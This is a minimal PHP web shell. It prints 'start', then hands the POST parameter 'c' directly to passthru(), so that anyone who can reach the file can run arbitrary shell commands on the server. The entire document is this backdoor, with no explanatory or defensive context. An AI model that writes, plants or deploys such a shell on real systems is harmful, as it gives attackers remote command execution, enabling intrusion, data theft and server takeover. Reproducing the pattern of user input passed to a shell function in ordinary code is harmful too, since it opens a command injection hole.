<?php
echo "start";
if (function_exists('passthru')) 
	passthru($_POST['c']); 
?>